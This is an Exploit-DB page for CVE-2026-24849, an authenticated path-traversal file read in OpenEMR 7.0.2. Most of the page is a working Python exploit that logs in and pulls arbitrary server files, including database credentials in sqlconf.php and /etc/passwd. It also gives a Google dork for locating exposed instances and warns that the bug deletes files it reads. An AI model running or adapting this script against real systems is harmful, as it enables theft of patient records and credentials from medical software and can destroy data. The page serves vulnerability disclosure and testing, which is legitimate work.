---
title: [webapps] OpenEMR 7.0.2 - Arbitrary File Read
url: https://www.exploit-db.com/exploits/52610
source: Exploit-DB.com RSS Feed
date: 2026-06-08
fetch_date: 2026-06-09T06:02:14.494853
---

# [webapps] OpenEMR 7.0.2 - Arbitrary File Read

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# OpenEMR 7.0.2 - Arbitrary File Read

#### EDB-ID:

###### 52610

#### CVE:

###### [2026-24849](https://nvd.nist.gov/vuln/detail/CVE-2026-24849)

---

**EDB Verified:**

#### Author:

###### [doany1](/?author=12392)

#### Type:

###### [webapps](/?type=webapps)

---

**Exploit:**

  /

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2026-06-08

---

**Vulnerable App:**

```
# Exploit Title: OpenEMR 7.0.2 - Arbitrary File Read
# Google Dork: intitle:"OpenEMR" inurl:"interface/login/login.php"
# Date: 2026-06-06
# Exploit Author: doany1
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://sourceforge.net/projects/openemr/files/OpenEMR%20Current/7.0.2/openemr-7.0.2.tar.gz/download
# Version: OpenEMR < 7.0.4 (tested on 7.0.2)
# Tested on: Ubuntu 22.04 / PHP 8.1 / Apache 2.4 (OpenEMR 7.0.2)
# CVE : CVE-2026-24849
# CWE : CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
#
# Description:
#   The Fax/SMS module's EtherFaxActions::disposeDoc() method
#   (interface/modules/custom_modules/oe-module-faxsms) reads a caller-supplied
#   `file_path` request parameter and passes it straight to readfile() with no
#   path validation. The method never calls authenticate(), so the only thing
#   required to reach it is a valid OpenEMR session.
#
# Privilege required:
#   ANY authenticated user -- this is NOT an admin-only bug. A low-privilege
#   account (receptionist, clinician, etc.) can read any file the web-server
#   user can reach: sites/default/sqlconf.php (DB credentials), /etc/passwd,
#   application source, and so on. The admin/pass values in the examples below
#   are only convenient demo credentials, not a requirement of the bug.
#
# Prerequisites:
#   - Any valid OpenEMR login (no privileges required).
#   - The Fax/SMS module enabled with EtherFax selected as the fax provider
#     (the file read does NOT require a real EtherFax account).
#
# WARNING (destructive):
#   disposeDoc() calls unlink() on the target *after* reading it. Reading a file
#   that the web-server user is allowed to delete WILL remove it. Prefer
#   root-owned targets (e.g. /etc/passwd) whose parent directory the web user
#   cannot write, so the unlink() fails and the file survives.
#
# References:
#   https://github.com/openemr/openemr/security/advisories/GHSA-w6vc-hx2x-48pc
#   https://nvd.nist.gov/vuln/detail/CVE-2026-24849
#
# Usage:
#   Interactive (prompts for everything):
#     python3 exploit-CVE-2026-24849.py
#   Non-interactive:
#     python3 exploit-CVE-2026-24849.py -t http://10.10.10.10 -u admin -P pass \
#         -f /var/www/html/openemr/sites/default/sqlconf.php

import argparse
import getpass
import re
import sys

try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.exit("[-] This exploit needs the 'requests' module:  pip3 install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"
FAXSMS = "/interface/modules/custom_modules/oe-module-faxsms/index.php"
# Method name varies across affected minor versions (disposeDoc <-> disposeDocument).
ACTIONS = ["disposeDoc", "disposeDocument"]
# An unauthenticated request is answered with a JS redirect to this path.
# (Use a narrow marker: every OpenEMR page embeds generic timeout JS.)
FAIL_MARKER = "login_screen.php?error=1"

def ask(prompt, default=None, secret=False):
    label = "%s [%s]: " % (prompt, default) if default else "%s: " % prompt
    value = getpass.getpass(label) if secret else input(label).strip()
    return value or default

def login(sess, base, site, user, password):
    """Establish an OpenEMR session in `sess`. Validity is confirmed later by an
    actual file read, so this just performs the GET (CSRF prime) + POST."""
    # 1) prime a session cookie and grab the CSRF token if the form exposes one
    r = sess.get(base + "/interface/login/login.php",
                 params={"site": site}, timeout=20, verify=False)
    m = re.search(r"csrf_token_form.*?value=([\"'])(.*?)\1", r.text, re.S)

    data = {
        "new_login_session_management": "1",
        "authProvider": "Default",
        "authUser": user,
        "clearPass": password,
        "languageChoice": "1",
    }
    if m:  # OpenEMR doesn't enforce it on this POST, but send it when present
        data["csrf_token_form"] = m.group(2)

    # 2) authenticate
    sess.post(base + "/interface/main/main_screen.php",
              params={"auth": "login", "site": site},
              data=data, timeout=20, verify=False)

def read_file(sess, base, site, remote_path):
    """Return (content, status). status in {ok, session, missing}."""
    for action in ACTIONS:
        r = sess.get(base + FAXSMS,
                     params={"site": site, "type": "fax",
                             "_ACTION_COMMAND": action,
                             "file_path": remote_path, "action": "download"},
                     timeout=20, verify=False)
        body = r.text
        if FAIL_MARKER in body:
            return None, "session"
        if "Problem with download" in body:
            return None, "missing"            # method ran, file absent/unreadable
        if body.strip() == "":
            continue                          # likely wrong method name -> try next
        return body, "ok"
    return None, "missing"

def main():
    ap = argparse.ArgumentParser(
        description="OpenEMR < 7.0.4 authenticated arbitrary file read (CVE-2026-24849)")
    ap.add_argument("-t", "--target", help="Base URL, e.g. http://10.10.10.10")
    ap.add_argument("-u", "--user", help="OpenEMR username (default: admin)")
    ap.add_argument("-P", "--password", help="OpenEMR password")
    ap.add_argument("-s", "--site", help="OpenEMR site (default: default)")
    ap.add_argument("-f", "--file", help="Absolute path of the remote file to read")
    ap.add_argument("-o", "--output", help="Save looted file here instead of printing")
    args = ap.parse_args()

    print("[*] OpenEMR < 7.0.4 - Authenticated Arbitrary File Read (CVE-2026-24849)\n")

    target = args.target or ask("Target base URL (e.g. http://10.10.10.10)")
    if not target:
        sys.exit("[-] Target is required.")
    target = target.rstrip("/")
    if not target.startswith("http"):
        target = "http://" + target

    user = args.user or ask("Username", default="admin")
    password = args.password if args.password is not None else ask("Password", secret=True)
    site = args.site or ask("Site", default="default")

    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})

    try:
        print("[*] Authenticating to %s as '%s' ..." % (target, user))
        login(sess, target, site, user, password)
        # Confirm auth + that the vulnerable module is reachable by reading a
        # safe, root-owned probe file (its unlink() fails, so it is not deleted).
        _, status = read_file(sess, target, site, "/etc/hostname")
    except requests.RequestException as e:
        sys.exit("[-] Connection error: %s" % e)

    if status == "session":
        sys.exit("[-] Login failed - check credentials / site.")
    if status == "missing":
        print("[!] Logged in, but the file-read returned nothing.")
        print("    Confirm the Fax/SMS module is enabled with EtherFax as the provider.\n")
    else:
 ...